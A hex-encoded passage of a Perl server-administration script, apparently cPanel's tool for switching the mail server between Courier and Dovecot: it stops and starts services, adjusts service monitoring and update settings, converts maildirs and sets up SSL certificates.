20 62 65 20 72 75 6E 6E 69 6E 67 20 61 6C 72 65 61 64 79 2E <br>5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 50 6C 65 61 73 65 20 77 <br>61 69 74 20 66 6F 72 20 74 68 65 20 63 6F 6E 76 65 72 73 69 6F 6E 20 74 <br>6F 20 66 69 6E 69 73 68 20 62 65 66 6F 72 65 20 61 74 74 65 6D 70 74 69 <br>6E 67 20 61 6E 6F 74 68 65 72 2E 5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 <br>20 31 3B 0A 7D 0A 0A 24 63 70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 <br>69 6C 73 65 72 76 65 72 27 7D 20 3D 20 24 73 65 6C 65 63 74 65 64 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 69 66 20 28 20 24 73 65 6C 65 63 74 65 64 <br>5F 6D 61 69 6C 73 65 72 76 65 72 20 6E 65 20 27 64 69 73 61 62 6C 65 64 <br>27 20 29 3B 0A 43 70 61 6E 65 6C 3A 3A 43 6F 6E 66 69 67 3A 3A 73 61 76 <br>65 63 70 63 6F 6E 66 28 24 63 70 63 6F 6E 66 5F 72 65 66 29 3B 0A 6D 79 <br>20 24 64 69 73 74 72 6F 20 20 20 20 20 20 3D 20 43 70 61 6E 65 6C 3A 3A <br>53 79 73 3A 3A 4F 53 3A 3A 67 65 74 6F 73 28 29 3B 0A 6D 79 20 24 69 6E <br>69 74 20 20 20 20 20 20 20 20 3D 20 43 70 61 6E 65 6C 3A 3A 49 6E 69 74 <br>2D 3E 6E 65 77 28 29 3B 0A 6D 79 20 24 65 72 72 6F 72 5F 63 6F 75 6E 74 <br>20 3D 20 30 3B 0A 0A 23 62 72 61 6E 63 68 20 74 6F 20 75 6E 69 6E 73 61 <br>6C 6C 2F 69 6E 73 74 61 6C 6C 20 66 75 6E 63 74 69 6F 6E 73 0A 64 69 73 <br>61 62 6C 65 5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 28 <br>29 3B 0A 0A 69 66 20 28 20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 6C 73 <br>65 72 76 65 72 20 65 71 20 27 63 6F 75 72 69 65 72 27 20 29 20 7B 0A 20 <br>20 20 20 64 69 73 61 62 6C 65 5F 6E 6F 6E 65 28 29 3B 0A 20 20 20 20 64 <br>69 73 61 62 6C 65 5F 64 6F 76 65 63 6F 74 28 29 3B 0A 20 20 20 20 65 6E <br>61 62 6C 65 5F 63 6F 75 72 69 65 72 28 29 3B 0A 20 20 20 20 65 6E 61 62 <br>6C 65 5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 28 29 3B <br>0A 7D 0A 65 6C 73 69 66 20 28 20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 <br>6C 73 65 72 76 65 72 20 65 71 20 27 64 6F 76 65 63 6F 74 27 20 29 20 7B <br>0A 20 20 20 20 64 69 73 61 62 6C 65 5F 6E 6F 6E 65 28 29 3B 0A 20 20 20 <br>20 64 69 73 61 62 6C 65 5F 63 6F 75 72 69 65 72 28 29 3B 0A 20 20 20 20 <br>65 6E 61 62 6C 65 5F 64 6F 76 65 63 6F 74 28 29 3B 0A 20 20 20 20 65 6E <br>61 62 6C 65 5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 28 <br>29 3B 0A 7D 0A 65 6C 73 65 20 7B 0A 20 20 20 20 65 6E 61 62 6C 65 5F 6E <br>6F 6E 65 28 29 3B 0A 20 20 20 20 64 69 73 61 62 6C 65 5F 64 6F 76 65 63 <br>6F 74 28 29 3B 0A 20 20 20 20 64 69 73 61 62 6C 65 5F 63 6F 75 72 69 65 <br>72 28 29 3B 0A 7D 0A 0A 72 65 63 6F 6E 66 69 67 75 72 65 5F 65 78 69 6D <br>28 29 3B 0A 72 75 6E 5F 66 61 73 74 6D 61 69 6C 28 29 3B 0A 24 70 69 64 <br>5F 6F 62 6A 2D 3E 72 65 6D 6F 76 65 5F 70 69 64 5F 66 69 6C 65 28 29 3B <br>0A 69 66 20 28 24 65 72 72 6F 72 5F 63 6F 75 6E 74 29 20 7B 0A 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 57 41 52 4E 49 4E 47 3A 20 53 6F 6D 65 20 <br>65 72 72 6F 72 73 20 65 6E 63 6F 75 6E 74 65 72 65 64 20 64 75 72 69 6E <br>67 20 74 68 65 20 63 6F 6E 76 65 72 73 69 6F 6E 20 70 72 6F 63 65 73 73 <br>5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 20 31 3B 0A 7D 0A 65 6C 73 65 20 <br>7B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 4D 61 69 6C 73 65 72 76 65 <br>72 20 63 6F 6E 76 65 72 73 69 6F 6E 20 63 6F 6D 70 6C 65 74 65 5C 6E 22 <br>3B 0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 73 75 62 20 72 75 6E <br>5F 66 61 73 74 6D 61 69 6C 20 7B 0A 20 20 20 20 73 79 73 74 65 6D 20 27 <br>2F 73 63 72 69 70 74 73 2F 66 61 73 74 6D 61 69 6C 27 3B 0A 7D 0A 0A 73 <br>75 62 20 64 69 73 61 62 6C 65 5F 6E 6F 6E 65 20 7B 0A 20 20 20 20 75 6E <br>6C 69 6E 6B 20 27 2F 65 74 63 2F 69 6D 61 70 64 69 73 61 62 6C 65 27 20 <br>20 20 69 66 20 28 20 2D 65 20 27 2F 65 74 63 2F 69 6D 61 70 64 69 73 61 <br>62 6C 65 27 20 29 3B 0A 20 20 20 20 75 6E 6C 69 6E 6B 20 27 2F 65 74 63 <br>2F 63 70 69 6D 61 70 64 69 73 61 62 6C 65 27 20 69 66 20 28 20 2D 65 20 <br>27 2F 65 74 63 2F 63 70 69 6D 61 70 64 69 73 61 62 6C 65 27 20 29 3B 0A <br>20 20 20 20 75 6E 6C 69 6E 6B 20 27 2F 65 74 63 2F 69 6D 61 70 64 64 69 <br>73 61 62 6C 65 27 20 20 69 66 20 28 20 2D 65 20 27 2F 65 74 63 2F 69 6D <br>61 70 64 64 69 73 61 62 6C 65 27 20 29 3B 0A 7D 0A 0A 73 75 62 20 64 69 <br>73 61 62 6C 65 5F 64 6F 76 65 63 6F 74 20 7B 0A 20 20 20 20 70 72 69 6E <br>74 20 22 5C 6E 48 61 6C 74 69 6E 67 20 44 6F 76 65 63 6F 74 5C 6E 22 3B <br>0A 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D <br>3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 28 20 27 64 6F 76 65 63 6F 74 27 2C <br>20 27 73 74 6F 70 27 20 29 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E <br>44 69 73 61 62 6C 69 6E 67 20 44 6F 76 65 63 6F 74 20 69 6E 20 69 6E 69 <br>74 20 73 79 73 74 65 6D 5C 6E 22 3B 0A 20 20 20 20 24 6F 75 74 70 75 74 <br>20 3D 20 24 69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F <br>72 5F 6F 6E 65 28 20 27 64 69 73 61 62 6C 65 27 2C 20 27 64 6F 76 65 63 <br>6F 74 27 20 29 3B 0A 7D 0A 0A 73 75 62 20 64 69 73 61 62 6C 65 5F 63 6F <br>75 72 69 65 72 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 48 61 6C <br>74 69 6E 67 20 43 6F 75 72 69 65 72 5C 6E 22 3B 0A 20 20 20 20 6D 79 20 <br>40 73 65 72 76 69 63 65 73 20 3D 20 71 77 28 63 6F 75 72 69 65 72 2D 69 <br>6D 61 70 20 63 6F 75 72 69 65 72 2D 61 75 74 68 6C 69 62 29 3B 0A 20 20 <br>20 20 69 66 20 28 20 24 64 69 73 74 72 6F 20 65 71 20 27 66 72 65 65 62 <br>73 64 27 20 29 20 7B 0A 20 20 20 20 20 20 20 20 40 73 65 72 76 69 63 65 <br>73 20 3D 20 71 77 28 63 6F 75 72 69 65 72 2D 69 6D 61 70 2D 70 6F 70 33 <br>64 20 63 6F 75 72 69 65 72 2D 69 6D 61 70 2D 70 6F 70 33 64 2D 73 73 6C <br>20 63 6F 75 72 69 65 72 2D 69 6D 61 70 2D 69 6D 61 70 64 20 63 6F 75 72 <br>69 65 72 2D 69 6D 61 70 2D 69 6D 61 70 64 2D 73 73 6C 20 63 6F 75 72 69 <br>65 72 2D 61 75 74 68 64 61 65 6D 6F 6E 64 29 3B 0A 20 20 20 20 7D 0A 20 <br>20 20 20 66 6F 72 65 61 63 68 20 6D 79 20 24 73 65 72 76 69 63 65 20 28 <br>40 73 65 72 76 69 63 65 73 29 20 7B 0A 20 20 20 20 20 20 20 20 6D 79 20 <br>24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D <br>6D 61 6E 64 28 20 24 73 65 72 76 69 63 65 2C 20 27 73 74 6F 70 27 20 29 <br>3B 0A 20 20 20 20 7D 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 44 69 73 <br>61 62 6C 69 6E 67 20 43 6F 75 72 69 65 72 20 69 6E 20 69 6E 69 74 20 73 <br>79 73 74 65 6D 5C 6E 22 3B 0A 20 20 20 20 66 6F 72 65 61 63 68 20 6D 79 <br>20 24 73 65 72 76 69 63 65 20 28 40 73 65 72 76 69 63 65 73 29 20 7B 0A <br>20 20 20 20 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E <br>69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F 72 5F 6F 6E 65 28 <br>20 27 64 69 73 61 62 6C 65 27 2C 20 24 73 65 72 76 69 63 65 20 29 3B 0A <br>20 20 20 20 7D 0A 7D 0A 0A 23 20 53 74 72 69 63 74 6C 79 20 73 70 65 61 <br>6B 69 6E 67 2C 20 74 6F 75 63 68 69 6E 67 20 2F 65 74 63 2F 69 6D 61 70 <br>64 69 73 61 62 6C 65 20 77 69 6C 6C 20 63 61 75 73 65 20 63 68 6B 73 72 <br>76 64 20 74 6F 20 73 6B 69 70 20 6F 76 65 72 0A 23 20 72 65 73 74 61 72 <br>74 69 6E 67 20 44 6F 76 65 63 6F 74 20 6F 72 20 43 6F 75 72 69 65 72 2C <br>20 62 75 74 20 74 68 69 73 20 77 69 6C 6C 20 73 74 6F 70 20 69 74 20 66 <br>72 6F 6D 20 65 76 65 6E 20 70 6F 6C 6C 69 6E 67 20 66 6F 72 20 74 68 65 <br>73 65 20 70 72 6F 63 65 73 73 65 73 0A 73 75 62 20 64 69 73 61 62 6C 65 <br>5F 63 68 6B 73 72 76 64 5F 6D 6F 6E 69 74 6F 72 69 6E 67 20 7B 0A 20 20 <br>20 20 6D 79 20 25 6D 6F 6E 69 74 6F 72 65 64 5F 73 65 72 76 69 63 65 73 <br>20 3D 20 43 70 61 6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 3A 3A 67 65 74 <br>6D 6F 6E 69 74 6F 72 65 64 28 29 3B 0A 20 20 20 20 69 66 20 28 20 21 24 <br>6D 6F 6E 69 74 6F 72 65 64 5F 73 65 72 76 69 63 65 73 7B 27 69 6D 61 70 <br>27 7D 20 26 26 20 21 24 6D 6F 6E 69 74 6F 72 65 64 5F 73 65 72 76 69 63 <br>65 73 7B 27 70 6F 70 27 7D 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 43 68 6B 73 72 76 64 20 6D 6F 6E 69 74 6F 72 69 6E <br>67 20 69 73 20 64 69 73 61 62 6C 65 64 5C 6E 22 3B 0A 20 20 20 20 7D 0A <br>20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 <br>20 22 5C 6E 44 69 73 61 62 6C 69 6E 67 20 43 68 6B 73 72 76 64 20 6D 6F <br>6E 69 74 6F 72 69 6E 67 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 43 70 61 <br>6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 3A 3A 64 69 73 61 62 6C 65 28 27 <br>69 6D 61 70 27 29 3B 0A 20 20 20 20 20 20 20 20 43 70 61 6E 65 6C 3A 3A <br>43 68 6B 73 65 72 76 64 3A 3A 64 69 73 61 62 6C 65 28 27 70 6F 70 27 29 <br>3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 27 2F 73 63 72 69 70 <br>74 73 2F 72 65 73 74 61 72 74 73 72 76 5F 63 68 6B 73 72 76 64 27 29 3B <br>0A 20 20 20 20 7D 0A 7D 0A 0A 73 75 62 20 65 6E 61 62 6C 65 5F 6E 6F 6E <br>65 20 7B 0A 20 20 20 20 73 79 73 74 65 6D 28 20 27 74 6F 75 63 68 27 2C <br>20 27 2F 65 74 63 2F 69 6D 61 70 64 69 73 61 62 6C 65 27 20 29 3B 0A 20 <br>20 20 20 70 72 69 6E 74 20 22 5C 6E 44 69 73 61 62 6C 69 6E 67 20 6D 61 <br>69 6C 20 73 65 72 76 65 72 20 75 70 64 61 74 65 73 5C 6E 22 3B 0A 20 20 <br>20 20 6D 79 20 24 75 70 64 61 74 65 63 6F 6E 66 20 3D 20 43 70 61 6E 65 <br>6C 3A 3A 55 70 64 61 74 65 3A 3A 6C 6F 61 64 75 70 64 61 74 65 63 6F 6E <br>66 69 67 28 29 3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E <br>7B 27 43 4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 3B <br>0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 44 4F 56 45 <br>43 4F 54 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 3B 0A 20 20 20 20 43 <br>70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 76 65 75 70 64 61 74 <br>65 63 6F 6E 66 69 67 28 24 75 70 64 61 74 65 63 6F 6E 66 29 3B 0A 7D 0A <br>0A 73 75 62 20 65 6E 61 62 6C 65 5F 64 6F 76 65 63 6F 74 20 7B 0A 20 20 <br>20 20 70 72 69 6E 74 20 22 5C 6E 43 68 65 63 6B 69 6E 67 20 74 68 61 74 <br>20 44 6F 76 65 63 6F 74 20 69 73 20 75 70 20 74 6F 20 64 61 74 65 5C 6E <br>22 3B 0A 20 20 20 20 6D 79 20 24 75 70 64 61 74 65 63 6F 6E 66 20 20 20 <br>20 20 20 3D 20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 6C 6F 61 <br>64 75 70 64 61 74 65 63 6F 6E 66 69 67 28 29 3B 0A 20 20 20 20 6D 79 20 <br>25 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E 66 20 3D 20 25 7B 24 75 70 <br>64 61 74 65 63 6F 6E 66 7D 3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F <br>6E 66 2D 3E 7B 27 43 4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 6E 65 76 <br>65 72 27 3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 <br>44 4F 56 45 43 4F 54 55 50 27 7D 20 3D 20 27 64 61 69 6C 79 27 3B 0A 20 <br>20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 53 59 53 55 50 27 <br>7D 20 20 20 20 20 3D 20 27 64 61 69 6C 79 27 3B 0A 20 20 20 20 43 70 61 <br>6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 76 65 75 70 64 61 74 65 63 <br>6F 6E 66 69 67 28 24 75 70 64 61 74 65 63 6F 6E 66 29 3B 0A 20 20 20 20 <br>6D 79 20 40 64 6F 76 65 63 6F 74 75 70 20 3D 20 28 27 2F 73 63 72 69 70 <br>74 73 2F 64 6F 76 65 63 6F 74 75 70 27 29 3B 0A 20 20 20 20 70 75 73 68 <br>20 40 64 6F 76 65 63 6F 74 75 70 2C 20 27 2D 2D 66 6F 72 63 65 27 20 69 <br>66 20 28 24 66 6F 72 63 65 29 3B 0A 20 20 20 20 73 79 73 74 65 6D 28 40 <br>64 6F 76 65 63 6F 74 75 70 29 3B 0A 0A 20 20 20 20 75 6E 6C 65 73 73 20 <br>28 20 24 73 6B 69 70 5F 6D 61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 73 69 <br>6F 6E 20 7C 7C 20 28 20 21 24 66 6F 72 63 65 20 26 26 20 24 6C 61 73 74 <br>5F 61 63 74 69 76 65 5F 6D 61 69 6C 73 65 72 76 65 72 20 65 71 20 27 64 <br>6F 76 65 63 6F 74 27 20 29 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 43 6F 6E 76 65 72 74 69 6E 67 20 75 73 65 72 20 6D <br>61 69 6C 64 69 72 73 20 74 6F 20 44 6F 76 65 63 6F 74 20 66 6F 72 6D 61 <br>74 2E 2E 2E 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 <br>27 2F 73 63 72 69 70 74 73 2F 6D 61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 <br>74 65 72 20 2D 2D 66 6F 72 72 65 61 6C 20 2D 2D 6F 76 65 72 77 72 69 74 <br>65 20 2D 2D 74 6F 2D 64 6F 76 65 63 6F 74 27 29 3B 0A 20 20 20 20 20 20 <br>20 20 24 65 72 72 6F 72 5F 63 6F 75 6E 74 2B 2B 20 69 66 20 28 24 3F 29 <br>3B 0A 20 20 20 20 7D 0A 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 43 68 <br>65 63 6B 69 6E 67 20 53 53 4C 20 63 65 72 74 2E 2E 2E 22 3B 0A 20 20 20 <br>20 6D 79 20 24 64 6F 76 65 63 6F 74 5F 63 65 72 74 5F 72 65 66 20 3D 20 <br>43 70 61 6E 65 6C 3A 3A 53 53 4C 43 65 72 74 73 3A 3A 66 65 74 63 68 53 <br>53 4C 46 69 6C 65 73 28 20 27 73 65 72 76 69 63 65 27 20 3D 3E 20 27 64 <br>6F 76 65 63 6F 74 27 20 29 3B 0A 20 20 20 20 75 6E 6C 65 73 73 20 28 20 <br>24 64 6F 76 65 63 6F 74 5F 63 65 72 74 5F 72 65 66 2D 3E 7B 27 63 72 74 <br>27 7D 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 6D 69 <br>73 73 69 6E 67 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 <br>22 47 65 6E 65 72 61 74 69 6E 67 20 64 65 66 61 75 6C 74 20 63 65 72 74 <br>2E 2E 2E 22 3B 0A 20 20 20 20 20 20 20 20 6F 70 65 6E 20 4F 4C 44 53 54 <br>44 45 52 52 2C 20 27 3E 26 53 54 44 45 52 52 27 3B 0A 20 20 20 20 20 20 <br>20 20 6F 70 65 6E 20 53 54 44 45 52 52 2C 20 27 3E 27 2C 20 27 2F 64 65 <br>76 2F 6E 75 6C 6C 27 3B 0A 20 20 20 20 20 20 20 20 43 70 61 6E 65 6C 3A <br>3A 53 53 4C 43 65 72 74 73 3A 3A 63 72 65 61 74 65 44 65 66 61 75 6C 74 <br>53 53 4C 46 69 6C 65 73 28 20 27 73 65 72 76 69 63 65 27 20 3D 3E 20 27 <br>64 6F 76 65 63 6F 74 27 20 29 3B 0A 20 20 20 20 20 20 20 20 6F 70 65 6E <br>20 53 54 44 45 52 52 2C 20 27 3E 26 4F 4C 44 53 54 44 45 52 52 27 3B 0A <br>20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 64 6F 6E 65 5C 6E 22 3B 0A <br>20 20 20 20 20 20 20 20 6D 79 20 24 63 6F 75 72 69 65 72 5F 63 65 72 74 <br>5F 72 65 66 20 3D 20 43 70 61 6E 65 6C 3A 3A 53 53 4C 43 65 72 74 73 3A <br>3A 66 65 74 63 68 53 53 4C 46 69 6C 65 73 28 20 27 73 65 72 76 69 63 65 <br>27 20 3D 3E 20 27 63 6F 75 72 69 65 72 2D 69 6D 61 70 64 27 20 29 3B 0A <br>0A 20 20 20 20 20 20 20 20 69 66 20 28 20 24 63 6F 75 72 69 65 72 5F 63 <br>65 72 74 5F 72 65 66 2D 3E 7B 27 63 72 74 27 7D 20 29 20 7B 0A 20 20 20 <br>20 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 52 65 75 73 69 6E 67 20 <br>65 78 69 73 74 69 6E 67 20 43 6F 75 72 69 65 72 2D 49 4D 41 50 20 63 65 <br>72 74 2E 2E 2E 22 3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 24 63 6F 75 <br>72 69 65 72 5F 63 65 72 74 5F 72 65 66 2D 3E 7B 27 73 65 72 76 69 63 65 <br>27 7D 20 3D 20 27 64 6F 76 65 63 6F 74 27 3B 0A 20 20 20 20 20 20 20 20 <br>20 20 20 20 24 63 6F 75 72 69 65 72 5F 63 65 72 74 5F 72 65 66 2D 3E 7B <br>27 71 75 69 65 74 27 7D 20 20 20 3D 20 31 3B 0A 20 20 20 20 20 20 20 20 <br>20 20 20 20 6D 79 20 40 72 65 73 75 6C 74 20 3D 20 43 70 61 6E 65 6C 3A <br>3A 53 53 4C 43 65 72 74 73 3A 3A 69 6E 73 74 61 6C 6C 53 53 4C 46 69 6C <br>65 73 28 20 25 7B 24 63 6F 75 72 69 65 72 5F 63 65 72 74 5F 72 65 66 7D <br>20 29 3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 64 <br>6F 6E 65 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 7D 0A 20 20 20 20 7D 0A <br>20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 <br>20 22 64 6F 6E 65 5C 6E 22 3B 0A 20 20 20 20 7D 0A 0A 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 43 68 65 63 6B 69 6E 67 20 66 6F 72 20 65 78 70 69 <br>72 65 64 20 53 53 4C 20 63 65 72 74 73 2E 2E 2E 22 3B 0A 20 20 20 20 73 <br>79 73 74 65 6D 20 27 2F 75 73 72 2F 6C 6F 63 61 6C 2F 63 70 61 6E 65 6C <br>2F 62 69 6E 2F 63 68 65 63 6B 61 6C 6C 73 73 6C 63 65 72 74 73 27 3B 0A <br>20 20 20 20 70 72 69 6E 74 20 22 64 6F 6E 65 5C 6E 22 3B 0A 0A 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 6C 69 6E 67 20 44 6F 76 65 63 <br>6F 74 20 69 6E 20 69 6E 69 74 20 73 79 73 74 65 6D 5C 6E 22 3B 0A 20 20 <br>20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D 3E 72 75 <br>6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F 72 5F 6F 6E 65 28 20 27 65 6E 61 62 <br>6C 65 27 2C 20 27 64 6F 76 65 63 6F 74 27 20 29 3B 0A 20 20 20 20 70 72 <br>69 6E 74 20 22 5C 6E 53 74 61 72 74 69 6E 67 20 44 6F 76 65 63 6F 74 5C <br>6E 22 3B 0A 20 20 20 20 24 6F 75 74 70 75 74 20 3D 20 24 69 6E 69 74 2D <br>3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 28 20 27 64 6F 76 65 63 6F 74 27 2C <br>20 27 73 74 61 72 74 27 20 29 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C <br>6E 45 6E 61 62 6C 69 6E 67 20 44 6F 76 65 63 6F 74 20 75 70 64 61 74 65 <br>73 5C 6E 22 3B 0A 20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F <br>6E 66 7B 27 44 4F 56 45 43 4F 54 55 50 27 7D 20 3D 20 27 69 6E 68 65 72 <br>69 74 27 3B 0A 20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E <br>66 7B 27 43 4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 <br>3B 0A 20 20 20 20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 <br>76 65 75 70 64 61 74 65 63 6F 6E 66 69 67 28 20 5C 25 6F 72 69 67 5F 75 <br>70 64 61 74 65 63 6F 6E 66 20 29 3B 0A 7D 0A 0A 73 75 62 20 65 6E 61 62 <br>6C 65 5F 63 6F 75 72 69 65 72 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 22 <br>5C 6E 43 68 65 63 6B 69 6E 67 20 74 68 61 74 20 43 6F 75 72 69 65 72 20 <br>69 73 20 75 70 20 74 6F 20 64 61 74 65 5C 6E 22 3B 0A 20 20 20 20 6D 79 <br>20 24 75 70 64 61 74 65 63 6F 6E 66 20 20 20 20 20 20 3D 20 43 70 61 6E <br>65 6C 3A 3A 55 70 64 61 74 65 3A 3A 6C 6F 61 64 75 70 64 61 74 65 63 6F <br>6E 66 69 67 28 29 3B 0A 20 20 20 20 6D 79 20 25 6F 72 69 67 5F 75 70 64 <br>61 74 65 63 6F 6E 66 20 3D 20 25 7B 24 75 70 64 61 74 65 63 6F 6E 66 7D <br>3B 0A 20 20 20 20 24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 43 4F 55 <br>52 49 45 52 55 50 27 7D 20 3D 20 27 64 61 69 6C 79 27 3B 0A 20 20 20 20 <br>24 75 70 64 61 74 65 63 6F 6E 66 2D 3E 7B 27 44 4F 56 45 43 4F 54 55 50 <br>27 7D 20 3D 20 27 6E 65 76 65 72 27 3B 0A 20 20 20 20 24 75 70 64 61 74 <br>65 63 6F 6E 66 2D 3E 7B 27 53 59 53 55 50 27 7D 20 20 20 20 20 3D 20 27 <br>64 61 69 6C 79 27 3B 0A 20 20 20 20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 <br>74 65 3A 3A 73 61 76 65 75 70 64 61 74 65 63 6F 6E 66 69 67 28 24 75 70 <br>64 61 74 65 63 6F 6E 66 29 3B 0A 20 20 20 20 6D 79 20 40 63 6F 75 72 69 <br>65 72 75 70 20 3D 20 28 27 2F 73 63 72 69 70 74 73 2F 63 6F 75 72 69 65 <br>72 75 70 27 29 3B 0A 20 20 20 20 70 75 73 68 20 40 63 6F 75 72 69 65 72 <br>75 70 2C 20 27 2D 2D 66 6F 72 63 65 27 20 69 66 20 28 24 66 6F 72 63 65 <br>29 3B 0A 20 20 20 20 73 79 73 74 65 6D 28 40 63 6F 75 72 69 65 72 75 70 <br>29 3B 0A 0A 20 20 20 20 75 6E 6C 65 73 73 20 28 20 24 73 6B 69 70 5F 6D <br>61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 73 69 6F 6E 20 7C 7C 20 28 20 21 <br>24 66 6F 72 63 65 20 26 26 20 24 6C 61 73 74 5F 61 63 74 69 76 65 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 65 71 20 27 63 6F 75 72 69 65 72 27 20 29 <br>20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 43 6F <br>6E 76 65 72 74 69 6E 67 20 75 73 65 72 20 6D 61 69 6C 64 69 72 73 20 74 <br>6F 20 43 6F 75 72 69 65 72 20 66 6F 72 6D 61 74 2E 2E 2E 5C 6E 22 3B 0A <br>20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 27 2F 73 63 72 69 70 74 73 <br>2F 6D 61 69 6C 64 69 72 5F 63 6F 6E 76 65 72 74 65 72 20 2D 2D 66 6F 72 <br>72 65 61 6C 20 2D 2D 6F 76 65 72 77 72 69 74 65 20 2D 2D 74 6F 2D 63 6F <br>75 72 69 65 72 27 29 3B 0A 20 20 20 20 20 20 20 20 24 65 72 72 6F 72 5F <br>63 6F 75 6E 74 2B 2B 20 69 66 20 28 24 3F 29 3B 0A 20 20 20 20 7D 0A 20 <br>20 20 20 69 66 20 28 20 24 64 69 73 74 72 6F 20 65 71 20 27 66 72 65 65 <br>62 73 64 27 20 29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 <br>5C 6E 45 6E 61 62 6C 69 6E 67 20 63 6F 75 72 69 65 72 2D 61 75 74 68 64 <br>61 65 6D 6F 6E 64 20 69 6E 20 69 6E 69 74 20 73 79 73 74 65 6D 5C 6E 22 <br>3B 0A 20 20 20 20 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 24 <br>69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F 72 5F 6F 6E <br>65 28 20 27 65 6E 61 62 6C 65 27 2C 20 27 63 6F 75 72 69 65 72 2D 61 75 <br>74 68 64 61 65 6D 6F 6E 64 27 20 29 3B 0A 0A 20 20 20 20 20 20 20 20 23 <br>20 52 65 62 75 69 6C 64 69 6E 67 20 74 68 65 20 63 6F 6E 66 69 67 20 66 <br>69 6C 65 20 6F 6E 20 46 72 65 65 42 53 44 20 77 69 6C 6C 20 75 70 64 61 <br>74 65 20 74 68 65 20 72 63 2E 63 6F 6E 66 20 73 65 74 74 69 6E 67 73 0A <br>20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 52 65 63 6F 6E 66 69 <br>67 75 72 69 6E 67 20 6F 74 68 65 72 20 43 6F 75 72 69 65 72 20 73 65 72 <br>76 69 63 65 73 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D <br>28 20 27 2F 73 63 72 69 70 74 73 2F 63 6F 75 72 69 65 72 75 70 27 2C 20 <br>27 2D 